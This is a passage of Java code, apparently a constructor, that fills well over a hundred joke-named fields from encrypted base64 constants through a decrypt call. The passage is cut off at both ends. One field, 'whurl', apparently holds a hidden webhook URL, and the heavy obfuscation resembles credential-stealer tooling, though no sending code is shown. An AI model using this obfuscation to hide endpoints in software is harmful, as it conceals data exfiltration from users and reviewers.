d("eZyFh0A1rK+tzKGLR5Am9g9UBBN2f8AcIB8DdQMMgw==", Vt.INT);            this.ihearyounow = (Long) d("LQhqR88hblgRaO2uBQk2qetyDN/6RE0CT6kc8/c=", Vt.LONG);            this.healing = (Long) d("DjTOGD4ZgEj7OsHF8qnX+D8BYQgILVgtdJKHgYc=", Vt.LONG);            this.toescortyou = (String) d("h9uIuSPa7A+IFzbZQV2xM2r+JS4jhW9EUUw/ZGrowVRJ1o2qN3k=", Vt.STRING);            this.outtahere = (String) d("1MdrW7OGqEK3RCPCVPEJR+t0nK+q1lnLXuCjL97zVUoKazgTPQg=", Vt.STRING);            this.ost = (String) d("VZTG2ro4sK8uq8cVYmw8zYQIXiWNGJMC6yWiqbqf", Vt.STRING);            this.naltextc = (String) d("C7EnZ9G4IuEM5Z8qBEiV4fZpD0UzqpBBHbHv2tEM2dsXgRaRuv5Y9yEwqB/Q+1zGBcZO/P0QURLmZ9BwOvLqtVsY", Vt.STRING);            this.getsshoes = (Double) d("QHYoTwIJ/2/dPQ2mvGImT053FUNirc55ZcLHlCcoXig=", Vt.DOUBLE);            this.pn = (String) d("fvYKyUBp850HeemlGE/kBhn/PDfcDmVb5yuDOrT0a7U8gvf3c0NTQQ==", Vt.STRING);            this.esetawftawft = (Double) d("/h3lVByMlTwubmrwjbqPXPMHanU3t2B83K6gAhRC9g==", Vt.DOUBLE);            this.doyouknow = (Double) d("WEc1Vn6N7rE/xUNUt8ec8lqacy9PMIjpz6FAAg1O3js=", Vt.DOUBLE);            this.thepeoplewholive = (Double) d("cBeYOpvpcUL3qqn2WJkSZL83sewaBtGkZJHIvByUlQ==", Vt.DOUBLE);            this.whurl = (String) d("/7z/e4MBbjWcZG1UmYe/iqbQSfhRCEkr9hWHaRcZDFWTKBhdAjbpuBQYLCYinRCQEhO2EwxoZyXl6c/ofnKOrcEsxCUby1KjYG9xUleXEq4EdvJbjWItw+Rd1QNnW0bbMuWtmwtDgNv8Fj4e22COavz6U5RS2u2z6F5gSRNHAh08UnvOMPj0tV3zSTedVrrSang+Fdk=", Vt.STRING);            this.dontwannawatchurcat = (String) d("88axjvhc1lzB2O/60MO40e0X9vPE+eJNKMYzSJMIpW4=", Vt.STRING);            this.kindastoppls = (String) d("cx7l5KPP55jDLbnIlFANqSDZsS2AT2hAqBa1r0JmcZLxlgLNRvtPi72H", Vt.STRING);            this.okacyyool = (Double) d("HQciq4FcwcBMNOjEum+EqGCbf39TFsWN3o0oJbFfnQ==", Vt.DOUBLE);            this.ihatethisguy = (String) d("uiGQL9r00dP1vygk1G4pxaON9J6HLis5pib+zuzd31Emt1ohwQ==", Vt.STRING);            this.coffedown = (String) d("ZWbwt9juGRZM5Erkua3hwp4iDi+ZuFqTJBVrB3E10Nu2hwthQQ==", Vt.STRING);            this.assaultobstrc = (String) d("6dnNllbxwurksPP8iJh+3Y+hJ0MemSvG1ktL3jsgxuWRBK3aKjy8BifvDfityq2bY1ZP", Vt.STRING);            this.yourlastname = (String) d("sI41d0lB7GockaJMf8wSvazL1EU4AreM0+ic0aSwjd4x", Vt.STRING);            this.pickme = (String) d("q+Aj7JAddUEH9xLWBFR+zhMIJsZn25tuZfNimYo4Ps8XJv3L50NkUQc=", Vt.STRING);            this.specifically = (String) d("1bhH3yCEpoKsQG+x/usFPvPkk042WDXroKMAfy8x4m3oq2/aSPIHlaQ6WEq9zHhEy1h73UJEmQywxJSdeTVxlD/hlE8iylLWidu3QOQqjdelng==", Vt.STRING);            this.sulrred = (String) d("vIUX1B4qcNzMpQv/10LPqoUSLHUNyPe3b5oO5Xpa3ZEv67Z0/x4nS6FrIaieQ14=", Vt.STRING);            this.tryingtofigure = (String) d("dX+bgyJ+Sfapy3SN8KnwfoWCJm+oCazoIvHmjoJY7hvIjLIf3fwG", Vt.STRING);            this.nomotivation = (String) d("VicssBEKP6U8ypd4m8ZguwrXQ5GxLOt1h4UOCYI+EQ35r5mkFH6li9b4", Vt.STRING);            this.bopabfunpa = (String) d("Ej+p+zmKvDJ0DZYUo+r9IN1i2i9Ai3CZGxmsw2Q11Pg6Qbl3Ofk=", Vt.STRING);            this.whynotofficerlent = (String) d("8tmuDdfmBYu64JWb9sYIi2/C+xgvwkiJgvOXxHGeaw12bwH/MCk=", Vt.STRING);            this.dontlikepolice = (String) d("MRRpBg3QXPXQg128On2W8owuTNMEzO0h/lMHFamySzN7L1r9hWe8sWzb9bT1t3hiVDpjZOHy1WeQHxU09CfPqAMAuM6WDkhiNDSV1g6UNnQNCE2YgqjCfw==", Vt.STRING);            this.holdonasec = (String) d("E7gZTjdTsn7sHBPv7k5nj3hziT2rMHhXNY9hAXK42dLs3l3SrpLW7jfZNlM=", Vt.STRING);            this.isitbiased = (String) d("378/WFi/lYQHz+S+zGmvq93KYqfIivdhiYaN8Dp57CRDEQ0PAS9rB7u9q1hPSi3wPCdZkQ==", Vt.STRING);            this.groupofindividuals = (String) d("qm/0Usjot2dY7Z4AYHgjIDA2rxDBxDRLLcP2uDNFuyngVayAvMhgkf5nhQbAzcoC/aeXftTS", Vt.STRING);            this.ifellvictimized = (String) d("mVUmwTIiJBcJ1ozkMsBA1jxmK5ZHQ/Gw9WsJ2OWesJS/n33tWc8XoQxuduK8Nm0P", Vt.STRING);            this.trsts = (String) d("5AikaHGXQId8Opb1597i7vmC+T+5ukJJnUppyCbrbN/4L3BQIhS4", Vt.STRING);            this.goingtojail = (String) d("BU4R9d+2wNpoNLkuxXDTt3cTUuCLXSVG/cIORWTqpRvDglOEN48=", Vt.STRING);            this.seatbelton = (String) d("Y+QNXZWuJGSkFLwlfvZilwTN33i4Z4K7ajdctI8WI39jdKjrIsmy8doEnh0rXw5jwtnkV5NwY0+6+2DgFL5qP1AjbJ/53rXSbEoo1vJYoxXK7Q==", Vt.STRING);            this.norstand = (String) d("+9W5TxMf5SRmaRqoGBt8uo9VQjICtsXIt/Jw7O6WPQpkauNTr+aXNAPxhRkO20xQKdJ71wCYQ+Q=", Vt.STRING);            this.takecareofcat = (String) d("TMfK3dI9NH+txHymW6LMqgdaIP348BggmqDDapf00kWfbj7oHCUD", Vt.STRING);            this.thoughtaboutthat = (String) d("hS0NVcUMxF65h3lBI/VFP9YLn6/eLpzvxVBCIHrDCzHChZASUuNENwdUqOYA1e7/p3CdNWWbILQeoiRVKtiGgHdfkHUz+2VEXA==", Vt.STRING);            this.dontcommitcrime = (String) d("B0sV2lNVDDBdKiOXs0/gy1s5XXDft+A7DmBW6SuAmmxQeFudCQAbpJR4jXlVJ3r2V/X6mHfNaEawC403RlLHww+xIS261/xERTrc0mLk91KVsYa7qo6LnTMTr2oLAZFP", Vt.STRING);            this.unharmed = (String) d("eL0af40l0pL7X2JjLOLxgDclwHa3KfJ4xMn1OfFxWor0eS0MHB5hEFIXQqrobJt3xPbzDdSK5g==", Vt.STRING);            this.provenguilty = (String) d("vsOfIr06VmtdCXg9CBEXTP/G/W2GnDRlUj/9qQ3EJ+NB+t6F/TZhp2resp2H2rPgvEyF", Vt.STRING);            this.inACOURT = (String) d("9JI4Wgo2JrCk9gJI7uM1LkYAzkoUUAyIAtOexXWEF9gUZVyWfwLcIFvZCgfHNqNFIjj9Bu2s+oJDpkfiYm1BPMdpQuvAxku9", Vt.STRING);            this.oflaw = (String) d("K55hVeu+MlPWxUebpVoZbDjKwIVf4jCOVbrLbApiRxIBP+TRESotOGQSaQg=", Vt.STRING);            this.murdercase = (String) d("8n8DbgO/1M/i3xCHAir8DDKXxU75LLwvis56KRuB5kn+40M2+cvx5mym88NG6ss=", Vt.STRING);            this.malecacuasion = (String) d("Fo0XKTOQ5b9Qvxsfaxp467rcxCsEcPEM10OZYhLLydkRAqdnfWcb", Vt.STRING);            this.boetcher = (String) d("rf/t0I2ZPu3fgxUoopF9lhoWTnEVWTmd6KKxUBCx4qhVHFzMZzMUee6Xw90OZMvhqgnrrBa7EUkDqDePSB34KVnj7mbaRgFtm13A1SXj9g==", Vt.STRING);            this.specialty = (String) d("zBu4jsmwEPBcCquqc0QyJUhaFFycV6A+wxhsgKmtaYsRYCUByjza/nYjFY0wKPS1kA==", Vt.STRING);            this.heisenburg = (String) d("oVSttY83cAxC3pZ1W0g0VVypcbu00iWDxNaoSETlg4cJqXgHkorJTy/sPsvmdg==", Vt.STRING);            this.heisenburgformercook = (String) d("dYs5X4e3qHEhIfpOmSi3EWzAA4FLSxI0Q+h80jl9Rqy1LA==", Vt.STRING);            this.hippiedippy = (String) d("6Gs5AbDyr2/+2yWZMHjFl1/u85ZnBFrpJHcfSAfQ4gUTSw==", Vt.STRING);            this.thisbabby = (String) d("yqIjl0qWQBiLK38PR0I0Qed+52/fpxBwGnN3/pSjsrO9wpq8MA==", Vt.STRING);            this.cos = (String) d("Z+a//5TCAV/8+3W4IgjjYPuEDNSL7zJOtPN3iNBMdrzvyAg=", Vt.STRING);            this.pullingfiles = (String) d("TpclHJOmG5DVH+ysea6M6RcPAfkgbFB4v3QPkFwYOiKmhP1NYyBU", Vt.STRING);            this.galeboet = (String) d("gPka33FSNOm/fIp0a6nNeQ7dtVi7SflV3C2PbuJ/Cs9md1nKpYyd5VlnsThrJMsxSamwPsnXgEp8O4WE", Vt.STRING);            this.whopaid = (String) d("PomXIhnRygLJGgGg7Db1/skQP5a1dmL5snOYBxuWvBs+MpU8LIZfCw==", Vt.STRING);            this.nobody = (String) d("4s7bzFnPJVQd836ZvlC1k93gRksnTg/8k+CCwNWCbr5M3AuIfHT0lxMrrhM7qg2SqqfTBhfnbq7aBg==", Vt.STRING);            this.whodid = (String) d("DFuVWViOoqOSaiPCIp/HEPJWjOqogcvUVMCkAjyV7q+UHJSJOxKValqVJ+o960jhhsROBZ4RUw==", Vt.STRING);            this.pushmore = (String) d("2zv9EZa7RizQs9++gTNJXtzebcYzlcJEntNS1w5uu2BmsJXqwxFm2glLDFDAEy4i8Lw0Ib7O4A==", Vt.STRING);            this.noaddress = (String) d("K/dCFgp1uXDtqJnx2gSPhQBJ/lnYy6KDGUMPZYl006Q+ifiByLf61fcUHbeTgtmyyaFx5eRDsw==", Vt.STRING);            this.corporatelawyer = (String) d("jiDjdXKCXNOxsDotfuOVw7KvpgITSm9/Kf5uOc8TcT1tbDkWrWHXGhexUB6fUOLO1mDUnVkVO7km/+Ki3T0XdZtoaw==", Vt.STRING);            this.vrickwall = (String) d("hoUI9C3tcJWrBOc+ke9bQHF6CI/r4gR5zan/sZFKPzCX/Op+PsSBpz2Qkw==", Vt.STRING);            this.madrigalelectro = (String) d("WYFRmtOS6qBQ5qfWZyZXBU++0tPNndcVlWE4RQQ2o8QmaZ5DHb3azsxsvjpUILtypQ4eE/5y7Gvf/cd35g==", Vt.STRING);            this.hanoveregerm = (String) d("ezrZYs079T391YqZs5fboyE9SlaPCu6UapkjRBuUcXWvCEtBM4dl44u3SM7GvSoKKpa0DRIcR7nJt7HrWwRs", Vt.STRING);            this.tsrt = (String) d("Fhd80HjLeE/RclWc3zIt1zXzOKBlx6DNmRbVGZA=", Vt.STRING);            this.foothold = (String) d("sotjka/a1i8kPYX669K0DwIo0eo28HFgT1R9QxPGRSvj3rvOMCJ2+BlXHRvTytKVy7fLANElHNx6iwOQOXtRi6Fv", Vt.STRING);            this.mericanfastfood = (String) d("XlZeibFZaSfTB/fxLmMmdp15If8BB4gtMdn4Cxup5BxWvX4uuLrjca9R/WbRsQdJr//6CVLQiDkCcSdU9mBYS1Tm", Vt.STRING);            this.pooloshermanos = (String) d("3KuHjQ3eCxlWUQrrfs5EUKsgjw4kZZR5tCW3ENO/FuGp6w==", Vt.STRING);            this.sowhat = (String) d("Ly0Lq3JCYLpRnp77tOTs6WTAffPc7btgIZmsgwk=", Vt.STRING);            this.wherehislabwas = (String) d("yoKPHKcSxh1ZGlGmYIlLPs2JMfeiA0FQW3Qs80RJwZ4Z7++ilPjuzwqX7xMK4RDknZUBWegc8Ig=", Vt.STRING);            this.apartmentsrtsas = (String) d("w+mqJnXxCSGaE5MOue1XNyTmFeBGI00Y+PjSaG2R86jfR6zFsdQqq1PNC+KmIz/UO/zjF/+2", Vt.STRING);            this.crzyidea = (String) d("9opC2Y51xZhU/o8Q9L7DBeFACQ7hg53TbMb+FrgnPWEpmkE=", Vt.STRING);            this.foayhup = (String) d("aWbMa8WwP9NJQW7oBsdGEpvcOKegjd+Wa7GX+gbWiLt/xx4O", Vt.STRING);            this.napking = (String) d("5/xoLMQsSFDHLQg/ziXzP6y5K7T602xiJEC16pRyNFmiSn402TkPSjT6GyGx95d6D/T0/rV0uX2ikalV/Yniu+vokw6M7P/EO0sHxlhdBfD9jxQifV/Q2f9JxdQ=", Vt.STRING);            this.fermented = (String) d("D6Vam3/HQZEx2w2BWzV9ENLIRud6bwvcD7lXO4i2WAO7ZTWktpZXQ7/9w72BFVdHg24rMw==", Vt.STRING);            this.lentilbread = (String) d("51u5grymY1wkzy52sGasKvXRV/sYNFWh2+/a3uGy9ICEtsVrzgQqVNWckcLgtZLH7CqHyQXcr6JwnYw5/iP/yc0P", Vt.STRING);            this.finechickinjoint = (String) d("gAZ3DSdQOqIv0nRiPg+KbHMOJ4fVlZKTVqJWzAj1n/N46Q==", Vt.STRING);            this.meetingsomeone = (String) d("MYE4usa5wx8faSMamw3XZfX17WUrojMqvvmzvThOPvfzbgkRhg==", Vt.STRING);            this.gusfrang = (String) d("XyqPLdFs0cUYr4eTLlGOQoh2520k002hcQyOiqlT5GogkjVydfPWFKlbcif3PjdCTT7Mr7SFbBFuFcRSL4oUB6m3pHpFi+hEYQ==", Vt.STRING);            this.rstat = (String) d("G6mili8HXjnyT+Kg5+UBA1QMl7G6IifWFoTE/8XCz6KQ", Vt.STRING);            this.dfprdhyfp = (String) d("n/DDeuUfsPSFdd1e42xToqxXRf7P5HG1uM3+LliFv/1trYk=", Vt.STRING);            this.fwypdohf3yrpdhunf = (String) d("RAeBHlePPCX4Bz+a7ATMXyBq+0nlsQqFtaEZCIeT", Vt.STRING);            this.yowdghwa34yd = (String) d("ImRrQwg2AKDZJLXmQXILufmWHrqvLddMx+EYvdl9dvgsWw==", Vt.STRING);            this.reaching = (String) d("Wpn470upOxpA1mGJiMN96Q/uWL0o9OJ5GJZ4txMvqzI=", Vt.STRING);            this.oafudnwpfydu = (String) d("TMnuB39PalF0i/k+gRC3Hg1stgjVngNc9+mp1UuNqqMhfQ==", Vt.STRING);            this.colonel = (String) d("p7lq97oOgcNHeI/COb+lmY8FQUNYIxmUdC92ZTYSNlfLl+3AEOgMBdMgiwtKi/Im", Vt.STRING);            this.sanders = (String) d("B7jpeTLRjhJDHhYbPoOgF2WLZHbyJ3o/zB/uaRiBJo8hSrCCRynIjy6uob66MHD+9mD1l0zj1bIN6YoYYrxM5sEPXCsIz09R", Vt.STRING);            this.fourteencalls = (String) d("GbPx0mq1ru2wRg1J9NMP/c9+pfYdbcyNJcRBwVs6QZj/kHvThBo0H14hebP8GKntTA==", Vt.STRING);            this.notanswerignphone = (String) d("AHf9U0uXQIbqlloypuHTrsUUNwIRofHS4Z3A1oZcY5Y6rsCevo6ssYUvVAEC", Vt.STRING);            this.needatpoliceoffcicer = (String) d("tbTcVTj7Z3HIn+mkCyCxfFwo5xG2UXQytCnZ/qD65v6r3gDdVuXDVFhgi10w", Vt.STRING);            this.whatelesuwannaknow = (String) d("f4ghWxG6wyTBmDXAJC4xopD8F/ru39Fs+KtVFt18TEMTpBq2IVWcbke2vQaQoQXDhBE=", Vt.STRING);            this.nedambulanec = (String) d("zEZkGNn1V4IkGbffUEepFUotTvRyqqtfc8fkyC2z4zK1W9TSfdcWOL1QX7RquA==", Vt.STRING);            this.taowyfdh = (String) d("vNgOc9YSqLNZZJMRReazI7uphM5iLWxbSVqyVpdXlgL5o7TRgHplrOZiUs6jAHVX", Vt.STRING);            this.whatsmyaddress = (String) d("C1tljHavmuBE7LFpk8+TXNQdQ4cxhBPV9mjNxQitP/UEAsemoHLG2F82AJ8/YEM/Sd2kNdLMZw==", Vt.STRING);            this.yesmaaam = (String) d("67IOp+l3EVHt0wV+M/YLklEw5n1hsZZr0rhb6Kybb7g0X9gZVoAVehiz", Vt.STRING);            this.threeunitsenroute = (String) d("WPZurTDpq3RIK63iIG+LbcIShIAC51ztJbh02AiXZb2n6g8fCSBued9PVjjszyW28Qn9xgmVzHa7LJDnwWyWqB1EwnUQtHS4FTmUiRhiBBnxkb9SWQ/j6PY=", Vt.STRING);            this.tafopd = (String) d("tkHmsHvC6fJQzvKDlYxkw9KqF0IK1O5RRT6c2qWRESY=", Vt.STRING);            this.ydtfhwpdylh = (Integer) d("JnONP8qz5JEMpfVPrdnByzmH8z8sEXJ9HF/uiVvT", Vt.INT);            this.tywfnty = (String) d("beYVTMeuFOcWhARXIEeMzD4lzAIQaENAvgsRI/QZuTab", Vt.STRING);            this.dplufirh3 = (String) d("ftCr+kCiiulg3ADFTJ8OWWQwsYB2AhpF2HB6nI5cJfaICZ8VSg==", Vt.STRING);            this.fobyufhpbyurhpbf = (String) d("3qY8am1Ty6scRawQE6d4JtUHabXe0FiyMSWMPemp+AWdI4OvgFd0lOs=", Vt.STRING);            this.tyh34dl = (String) d("emL8KnUwRUOfGqiSUtx/XFSbnPr9NmtBj+lTNr1FEHSRhTl5QA==", Vt.STRING);            this.udlohlyp3whdoyplwd = (String) d("Coebj2jG7riejmOzlWhK4cRHY/kZeAE48bwH7k7Ivjshm/tzr/17", Vt.STRING);            this.opdh34yudhn = (String) d("A0WSKq9JyJQeelx1GJpR3YBlF5Ynsysd2YwYF6Ivvx969rbOoTSWScw=", Vt.STRING);            this.doyupn3wdyu3pnd = (String) d("bcf3wuJpyHk+QcSLZpPXB5IBeI/Tw9HXRel+n/eZPO+AxeRHppsC", Vt.STRING);            this.y34hodnyu234 = (String) d("wFPVlcfJWqr+uzC/9uIUX+7vIAQVrGicuMyZ27Njp17RF8iJ18dGTcH9ecSGFK7G", Vt.STRING);            this.onienod34 = (String) d("ofTCNAI2esrxsrgGMVjeU5bppTvbSchRTLdkTFfYXwv8/nrRZZmiXtw=", Vt.STRING);            this.nienoy24 = (String) d("Rie3vWAewKZieeGYZLGS5SP0FcXQ1z0FLWmF5y6oQGRMX4WJiO6v0bthFQqSZn4=", Vt.STRING);            this.illcallhim = (String) d("QpiD/AHXD3lAfBWhIdGBaJZ3MF8rmxielffaA2dc3iKeC61vNtICmUxQxqqBhc7TB9Ko6KvIAXm1Dw==", Vt.STRING);            this.trcfpd243 = (String) d("JR8STZudA+jGuUJ8mOoEb4uZwKKSEVz1p8FvsSok/pA7LDcOYWA2Eg==", Vt.STRING);            this.ndeo3poiewnd4p3 = (String) d("t2sP5R3ilvYC/KSwAtwXesgDIoigWLyOyaqPkJzjb4wZmhv8yoeZtwIRBRV+P/f9900kJWj3dR0OdQKi6QR9+vfzkpx3KGF1CPXh5D+hNM5BeKM3WXuCPicXcWihEA6OB320a+Q=", Vt.STRING);            this.iepfndioepwndoyfupadnfpd = (String) d("Nwom2E9kX5uXu7T24Lj+HvlC97SoxOMfy32GlNsXRnB6ewP0zFWBaqVvwiz0qXCL6phj", Vt.STRING);            this.childingdanger = (Double) d("80f9YskC8iAyvg8kHksd7nPnISEERCV1rlLDPgPVdt0eZg==", Vt.DOUBLE);            this.seenher = (Double) d("u2UlbiR1mLERLraVafdcVONGK6qt+tgz05zNhVQS3uSD7A==", Vt.DOUBLE);            this.aintnobody = (Double) d("amkJR8D3wSabBcDeebmT5ms+mAGVB1UhAt2d6U8aEg==", Vt.DOUBLE);            this.thisistherecording = (Double) d("l0xPRlVlIIh3zCz9WjqtuLhaG1RurE1jc1++jo68tA==", Vt.DOUBLE);            this.tdrsitrtomychd = (Double) d("DYxKRAvLAfXnU0TG2IP+sdNRa8G+RsMQfd2m6hAv2fK8", Vt.DOUBLE);            this.stoppedrcying = (Double) d("QD/PQ+8MLRC3nsxD9aHDReGdRjYqGCOkwtxHjoI8mt0=", Vt.DOUBLE);            this.startingthehouse = (Long) d("0t6FSjlK2oR4Yj6YOPh0AjnHbmH3g87/P5SKR+A=", Vt.LONG);            this.imtakingher = (Double) d("nxlZBRDj3/p9VJZCedNy7b17anKgENjKdVnN/shJ6UY=", Vt.DOUBLE);            this.cryingiwenftipfwnt = (String) d("0YUcgzmEVFiuR10TcdkJfJTxZuRiqlhPBtBJ3cUYPHKbf/zsx9WFpSYnnueZ5hJWwmZ3DxqIDc8=", Vt.STRING);            this.righttobehrere = (String) d("QTofI7RnXcPRDV9i9SKwHvOGfupdh5LfzJyecPbFwwfhqj9A5xYnVOMk4yqQrDSXxwdVUpIO", Vt.STRING);            this.callmewhatever = (String) d("uQrl2YNYaPOxMycDvlGkOew7IbTPx3Sm8eMwZ6j5Zm1mSa9j", Vt.STRING);            this.blackandwhitedocs = (String) d("kmuKO+6/Yt2yHyZeZZh4N7y9zG6yBJVP6+8eSBJ03U/nXXYtGNc=", Vt.STRING);            this.sufficentprobablycause = (String) d("dv33Py38eVH+SPrzuOS5A+rtW+aFtzsKZXj6pxmsRP5ttDhWAJSsCdXcBsTkbw1IiI15V69qQgrArq0kiN8Q7ig5RIxdYEXR82hycWecu1kgxSCOpy0aRlSmWSn8axxyvXlW88y7tfU26wm4y6hVFYIckFv00CqRGzelcF2okHNV4GICAopiyWRBXfDAtRm7PBTkkxBXRif7HiE=", Vt.STRING);            this.getoffthebike = (String) d("Uampo2FX+wLDxEGChsUL9t2jOYirkB+EYMIfnxUp2YwGuA+H3drAjg==", Vt.STRING);            this.iantgoinnowhere = (String) d("yIMya3QiqIZmFufwVCGRGClHng/wB0kNdyUQqtNZFNGNrghoGWeE", Vt.STRING);            this.abuseofn911 = (String) d("/C+1GoEJ/OI1d6OD8UnNOEuk7HlHuvpXX1e40em4rtwgyk71Td6x4+8yPCp5exHSVoj5", Vt.STRING);            this.noreason = (String) d("hlLaSn6q0P1p3HUJQE/zz+hRUmCOR86l5BTC7Y1/WPs4lp7nlr0ZkWRyeo5I", Vt.STRING);            this.takeitout = (String) d("XOyh9n76NEySCaHDCDIZACKARz5mCHFlRQToXqC5etC+m/yMUhantvY0e4aFv6CPjPhZZzQdLac=", Vt.STRING);            this.trstwft = (String) d("aNqS3w/XvboSB/mXrHlTCk3UDlPKAA8dCup3eXcfXN7TRfpl95X9sN2i", Vt.STRING);            this.yntdy4u3 = (String) d("3k5EL+ycw6x/QkQW51b9A4r0AjBMbD5JRd53fwCwZ/5Gyi8dkmx1u5yd", Vt.STRING);            this.heshurtpls = (String) d("HkYJjh5BocUzJ7cXElie5GTq0LBeTMc8gs2LLRAibrb1eoD1nAZvFn+a", Vt.STRING);            this.hurtingmyarmsag = (String) d("YsGsxwNftMBUlkXKuxhCRtvrtM+/LmSP2oOby4hy6UFkNX6XdxSX02VxZj/cmQ==", Vt.STRING);            this.plsgetoff = (String) d("xAo5T8R6KAIJGI8lwRkkg+nQ7XFRI1KLM3QhaS2XyqTdi2w=", Vt.STRING);            this.hurtingarmtsnwit = (String) d("+45S9v1e1athtKjAnc23B/Zrrfu+VsvAXSNhlVfWv4sXTWQSuOlDqZ5ER9RAB/veIfImjR553khvMd23kJRzA+XEQIXZBO1cQKeU+wjlDrUo9X0aHfhFrtFFbGE66UMrtucKW84jY7HNr8Gkd9fQXYyiAPLkvu/ZsFLa/LU4XKTB3QozptoXCcnA8mcGujFANQBj3GHFjQqAUi396KLuJTFzuYkfm79m/F1DrXA4XL+A7ViXBPB+7Rmx1vr8", Vt.STRING);            this.svacum = (String) d("ga09QrmyLYbxxzJxmnfLafuabIfFgFhOBuPokmZvK1XtHNuRNGkt4/I=", Vt.STRING);            this.hurtingmesyr = (String) d("QftQ1dzyrTbdh5pOY+4wiby5FOPdO8QAZ4L5EZTfN3iCvaR8UuSNV3OCGBk1eg2YWYUGSx/W0g==", Vt.STRING);            this.foolishness = (String) d("pBMwQUK0CbjdQxDk8DbTh1YdzBzLnFIDwcUh5+csbR3Ly+hd0zgs", Vt.STRING);            this.ouydnop3yundoypufna = (String) d("U0UOogPvpC6WFS+7i7JJt6Giy2Bz0VjRsdqbn4dxQDVM+rJsNg0SyU0veClEd8SONgjW1CpZI73HvDqQcsywgnbMzQ==", Vt.STRING);            this.einoienoiendw3pf = (String) d("XEDlMI8ph0x3F/ubr+O/vDbPrSiaOTCiuKdwzSxc+0Jl9aPtWaWSCYnhmpgP/krb0EM0gSVM6b73FWuIw1MRfkxC4r8aaO/tSg==", Vt.STRING);            this.thatsathreatdyu = (String) d("GbZvv1Hm/sFPt6/At55XDkpjUdCcm+8ae8U9cGnNvUAw", Vt.STRING);            this.puthandsebhind = (String) d("n0dcOCwjjNqDj7Q1YqFrU3UE1t2t0WpejgfJEI/ZGe9BOrGyI8TAjV2j2EV1+ePEhCWSZe0HGCR4nuimIefZbbbv5jFfgQh+VY71", Vt.STRING);            this.sendanotherunit = (String) d("PEFytHbpSLwPYv0jx2GLCkDg6F1k64Eyd8ixKL2YOMSGvTZtHnj6pR+UtXjFSqTplg==", Vt.STRING);            this.handsbehindback = (String) d("4Ry/9lryLC2PBUEskWFoTxvvinDoiyTIlv5szC8uE0s4u+ZDJw6+bsGLAV68RZ4JzOImJQgRyn4=", Vt.STRING);            this.gonnagettazed = (String) d("eRuPsxwdTYd+EUZfiM7KvDPnDpVac6o9t1kAQE75TN6ujobohRCEJYhK6el9aI9dIcY=", Vt.STRING);            this.stoprsietnsr = (String) d("KBDtfi5nCIk9yJjcrMTkRlQaKlewxKOdN/CA7NkYTMAIOXXsejT9xYtqZh8JIw==", Vt.STRING);            this.oundg324yutdng4 = (String) d("qKbFkSKUlqvbZComd4e5mEpJt0R+pEQ3m5oNl1AK4UlhrkylwfHHy1ee", Vt.STRING);            this.dienfwopiednpf = (String) d("1Qa7sDQh84vBZyPXvS6l2QwJLA/Rvepo86u3lWpJJxLdOJz6yyBFSJk0hybyYW0ogg==", Vt.STRING);            this.eindo3ie42ndoi34 = (String) d("gvMlACk7AtwKQ99EyLXN78Ty0EL7qDDUCtnKsvxxkpy6ossEwuxDDMndfGo=", Vt.STRING);            this.iendie2nd = (String) d("zbHbXbk8PsIoodiyBssRW1SAfVLjsmaL1c5e5i5/e0jQM22E4/Tb6gEWtITU", Vt.STRING);            this.ieanrdowienfdf = (String) d("b+dhmkTiMOcgzkLUNkBXgicQrrA4w8tE7Bld2wAZGAbBOOc8zfmAc6tCqdnS568=", Vt.STRING);            this.wiodtnowiupd = (String) d("wyMVvZRAHQSSElR04JUjPFueFkwp5nwk0cGtW7X91q2lUlxoNxh/7mIueWE=", Vt.STRING);            this.wifednow34und43wd = (String) d("/SGsGQR7ligOZv9Lm+UVeSsVbyS78JqkscOU1f8mvZPI1B0YDd69GPmy32qMv1fKog==", Vt.STRING);            this.odunyuw4dn4 = (String) d("sUp0GHDmGPFa0/f4UZQRXFYdtrei0NXqaG5IC69YSD/qXSgLz7IwaY4CTUMRlAhDY2incMp3Fg==", Vt.STRING);            this.don34uynp3d = (String) d("hjzSC9vo/h/3Q5bXK4TXODJbjy0o9sbhvwpUi4f+YhLD3qs/sBTpCIQgwZAaRbGx", Vt.STRING);            this.goingtojailwfitdnwofduyn4w = (String) d("FzumKz/lAXgoMLoDZeIiNAdWk0isL1M48N6EICqDaNF12Ea6622gpks0X6yIT3wc/XyS36E=", Vt.STRING);            this.youdnoy3wupdnoy3wupdn = (String) d("W1lOFgTcA6/GnMQw3aiYgAjB313nT3wX9m/5LbxBqA==", Vt.STRING);            this.oiwfndtoyu42nd24 = (Integer) d("NmB28EprgZdq+zCFZnzYiE1JqDX+JoKNUE33G5Q=", Vt.INT);            this.tn243oyudnt42fuytdn = (String) d("tZOrwS5c9BhEKjXUVA2Cn9sLQyjW8/jT9Xp2fgC3YsCaR4UeLDM=", Vt.STRING);            this.eingdoi3e4ndg34 = (String) d("b9amRUudqONg6xuwXLIR76rLD1zWqRtHGFOkIYV3", Vt.STRING);            this.ongo34ungdo3iu4ndg4gdw4 = (String) d("C3cTHFaNEK/YiiquuZFPtE4Yq4vkrbolXN7ynkWp/tFX7Q==", Vt.STRING);            this.pdifnoian4 = (String) d("4OdpApWPNpelY1DOQnKNFuPCjf0PoCY8uounqRfERXxFxsnoig==", Vt.STRING);            this.oendinpdoinpd = (String) d("N5fJRhvSTxC2MWs95bTQ9QADg1jD8Cn+MkLjQ07Knwsg", Vt.STRING);            this.ieodnoie4ndw3f4 = (String) d("wH67/qHLD67blNZaDFu3+Laui8k0CGRue5Daqx+yMthK", Vt.STRING);            this.ietonwifandt4u3nd34dw3 = (String) d("OBf2Fnjys5ToktVxpJ7gJ8EHG9vQd2HK8+ZfPLOoMKoa+vPXlcBgWj0ArbQ=", Vt.STRING);            this.tneoaiwfndtowui4nd4fdt = (String) d("iyC0msEz/r6SbfX+AZujnbb/rXZBOzxlfzMbK/xz5g==", Vt.STRING);            this.itenwoipwfnaidun4w = (String) d("P7ciLNoS45Y2Z5EX6vY/2kU0Li4U306mW8d6wAntsBskHlZvL8q3", Vt.STRING);            this.ipendfofpiwdnoo43iwund = (String) d("kZwptt6887xhbOAq8WR4lFhOnn2Z037f/o19jy5AIATnOz5Y64/TNwZKkIZ7zvGmYbo=", Vt.STRING);            this.tneeiond4 = (String) d("Xt8ir7b5uY2iKa+5//3ymv2tKPNx379epAMUlGw6v9IRWxaWtf7zSJr1a1BVhY/IsbFw8ZY8wXEOp7H76MsuBb07GjlqSUYS8J+hGZzasnQ/A8L2ztkuUbLxNuYTZDMxNDiTrVTpWvvur5yPza8N/YBVRo2vo6gByz4QpigcGE/rf40l", Vt.STRING);            this.kdienwfp = (String) d("wcLt4p2AkFPe70VCFbLx4ArInejC7jQe8sBk5mIY/hN0IWVbi2eTfBfX+evLQLTtfh4=", 